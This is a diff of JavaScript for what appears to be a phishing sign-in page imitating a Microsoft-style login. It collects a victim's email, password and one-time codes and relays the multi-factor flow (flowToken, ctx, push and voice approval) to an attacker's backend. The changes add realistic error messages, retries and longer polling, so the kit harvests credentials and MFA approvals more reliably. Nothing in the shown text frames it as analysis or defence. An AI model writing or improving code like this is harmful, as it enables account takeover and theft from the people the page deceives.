@@ -1,10 +1,10 @@
-var Errs={'NoOtpCode':'Enter the code to help us verify your identity.','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.','NoAccount':'We couldn\'t find an account with that username&period; Try another, or get a new account.','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, reset it now.'};
+var Errs={'NoOtpCode':'Enter the code to help us verify your identity.','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.','NoAccount':'We couldn\'t find an account with that username&period; Try another, or get a new account.','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, reset it now.','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again.','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>'};
 var email = "";
 var epass = "";
 var phone = "";
 var dVal = [];
 var lVal = [];
-var myInterval;
+var myInterval,Proofs;
 var url = new URL(window.location);
 var semail = url.searchParams.get("email");
 if(semail){
@@ -112,7 +112,6 @@ $("#load").hide();
 $("#error2").html(Errs['accIncorrect']);
 $("#epass").val("");
 $("#btn2").attr("disabled", false);
-
 return false;
 }
 });
@@ -120,17 +119,18 @@ return false;
 }
 
 async  function auth(dauth) {
+    if(Proofs){
+$("#screen2").html(Proofs);
+    }else{
 dVal["arrUserProofs"] = dauth["arrUserProofs"];
 dVal["ctx"] = dauth["ctx"];
 dVal["flowToken"] = dauth["flowToken"];
-$("#screen1").hide();
-$("#screen2 #load").show();
 var data = dauth["arrUserProofs"];
 console.log(data);
-// data= JSON.parse(data);
 var gototype=await GotoType('Proofs');
 if(gototype['status']){
-    $("#screen2 #load").hide();
+    Proofs=gototype['msg'];
+    $("#screen1").hide();
 $("#screen2").html(gototype['msg']);
 data.forEach(function (val, i) {
 var authid = val["authMethodId"];
@@ -140,23 +140,36 @@ phone = val["display"];
 });
 }
 }
+}
 async  function  GotoAuth(atype){
+    $("#screen2 #load").show();
 var reslt = await GotoType(atype);
 if(reslt['status']=='success'){
+   
 console.log(reslt['status']);
-$("#screen2").html(reslt['msg']);
 var act= await beginAuth(atype);
 if (act["Success"]) {
+     $("#screen2 #load").hide();
+$("#screen2").html(reslt['msg']);
 if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
 startEndath(atype);
 }
+}else{
+    authback(1);
 }
 }
 }
-function authback() {
+function authback(err) {
 $("#screen2 #load").show();
 auth(dVal);
 stopEndath();
+ if(err){
+         setTimeout(function(){
+       $("#screen2 #errorx").html(Errs['UnableVeri']);  
+       $("#screen2 #load").hide();
+   },1000)
+   
+    }
 }
 async function GotoType(atype) {
 var reslt= await $.ajax({
@@ -180,7 +193,7 @@ processAuth(atype, "");
 }
 }
 async function verifyOTC(atype) {
-$("#screen2 #staErr").hide();
+$("#screen2 #staErr").html('');
 var otc = $("#screen2 #otc").val();
 if(otc!=''){
 $("#screen2 #load").show();
@@ -188,16 +201,21 @@ $("#screen3 #verifyOTC").attr('disabled',true);
 var res= await endAuth(atype, otc);
 if (res["Success"]) {
 processAuth(atype, otc);
-}else{
+}else if (res["ResultValue"]=='InvalidSession'){
 $("#verifyOTC").attr('disabled',false);
-$("#screen2 #staErr").show();
-$("#screen2 #staErr div span").html(Errs['OathCodeIncorrect']);
+$("#screen2 #staErr").html(Errs['InvalidSession']);
+}else if (res["ResultValue"]=='OathCodeIncorrect'){
+$("#verifyOTC").attr('disabled',false);
+$("#screen2 #staErr").html(Errs['OathCodeIncorrect']);
+}else{
+    $("#screen2 #staErr").html('');
+  authback(1);
 }
+$("#screen2 #load").hide();
 console.log('res',res); 
 }else{
 $("#screen2 #load").hide();
-$("#screen2 #staErr").show();
-$("#screen2 #staErr div span").html(Errs['NoOtpCode']);
+$("#screen2 #staErr").html(Errs['NoOtpCode']);
 }
 
 }
@@ -217,6 +235,8 @@ if (vdata["Success"]) {
 lVal["ctx"] = vdata["Ctx"];
 lVal["flowToken"] = vdata["FlowToken"];
 lVal["sseid"] = vdata["SessionId"];
+}else{
+     $("#screen2 #errorx").html(Errs['UnableVeri']);  
 }
 console.log(vdata);
 });
@@ -241,7 +261,6 @@ otc +
 '","PollCount":' +
 PollCount +
 "}";
-console.log(valx);
 var rr = await  $.ajax({
 type: "POST",
 url: urlx,
@@ -252,7 +271,7 @@ mode: "eauth",
 },
 }).done(function (data) {
 var vdata = JSON.parse(data);
-
+console.log(vdata);
 lVal["ctx"] = vdata["Ctx"];
 lVal["flowToken"] = vdata["FlowToken"];
 lVal["sseid"] = vdata["SessionId"];
@@ -260,7 +279,9 @@ if (vdata["Success"]) {
 PollCount = 1;
 AuthEdata(atype);
 }
-if (PollCount >= 6) {
+if (PollCount >= 8) {
+    authback(1);
+   
 console.log("PollCount Stoped");
 stopEndath();
 }
